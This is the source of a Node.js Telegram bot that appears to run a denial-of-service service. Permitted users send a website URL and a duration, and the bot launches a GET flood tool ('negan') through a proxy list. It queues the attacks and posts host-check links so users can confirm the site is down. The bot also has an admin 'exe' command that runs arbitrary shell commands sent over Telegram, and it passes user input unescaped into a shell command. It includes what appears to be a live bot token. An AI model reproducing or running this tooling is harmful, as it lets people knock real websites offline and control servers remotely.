const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTimeAttacks = 120, maxConcurrentAttacks = 3, maxSlot = 1;

const bot = new TelegramBot(token, { polling: true });
const userProcesses = new Map(), currentAttacks = new Map(), attackQueue = [];

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

const sendMessage = (chatId, text, options = {}) => 
  bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...options });

const executeCommand = (chatId, host, time, username, userId) => {
  const pid = Date.now() % 1000000;
  const vietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
  
  sendMessage(chatId, 
    `🚀 Successfully 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${username}\nStart: ${vietnamTime()}`,
    { reply_markup: { inline_keyboard: [
      [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
      [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
    ]}
  });

  const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
  
  currentAttacks.set(pid, { userId, start: Date.now() });
  userProcesses.set(userId, { pid, start: Date.now(), time });

  child.on('error', err => {
    sendMessage(chatId, `❌ Error: ${err.message}`);
    cleanupProcess(pid, userId);
  });

  child.on('close', () => {
    sendMessage(chatId, `✅ Completed\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${username}\nEnd: ${vietnamTime()}`);
    cleanupProcess(pid, userId);
    processQueue();
  });
};

const cleanupProcess = (pid, userId) => {
  currentAttacks.delete(pid);
  userProcesses.delete(userId);
};

const processQueue = () => {
  if (attackQueue.length > 0 && currentAttacks.size < maxConcurrentAttacks) {
    const next = attackQueue.shift();
    sendMessage(next.chatId, `🔄 Executing queued command...`);
    bot.emit('message', {
      chat: { id: next.chatId },
      from: { id: next.userId, username: next.username },
      text: `${next.host} ${next.time}`
    });
  }
};

bot.on('message', async (msg) => {
  const { chat: { id: chatId }, text, from: { id: userId, username = 'Unknown' } = {} } = msg;
  const [isAdmin, isGroup] = [userId === adminId, allowedGroupIds.has(chatId)];

  if (!isAdmin && !isGroup) return sendMessage(chatId, '🚫 No permission');

  if (/^https?:\/\//.test(text)) {
    const [host, time] = text.split(' ');
    const timeNum = parseInt(time, 10);
    
    if (!host || !timeNum) return sendMessage(chatId, '🚫 Invalid format: <URL> <seconds>');
    if (timeNum > maxTimeAttacks) return sendMessage(chatId, `🚫 Max time: ${maxTimeAttacks}s`);
    
    const userAttackCount = [...currentAttacks.values()].filter(x => x.userId === userId).length;
    if (userAttackCount >= maxSlot) return sendMessage(chatId, `🚫 Max ${maxSlot} concurrent attacks`);

    if (currentAttacks.size >= maxConcurrentAttacks) {
      attackQueue.push({ chatId, host, time: timeNum, username, userId });
      return sendMessage(chatId, '⏳ Command queued');
    }

    executeCommand(chatId, host, timeNum, username, userId);
    return;
  }

  if (text.startsWith('exe ') && isAdmin) {
    const cmd = text.slice(4).trim();
    if (!cmd) return sendMessage(chatId, '🚫 Empty command');
    exec(cmd, (err, stdout, stderr) => 
      sendMessage(chatId, `<pre>${cmd}\n${err || stderr || stdout}</pre>`));
    return;
  }

  sendMessage(chatId, '🚫 Invalid command');
});
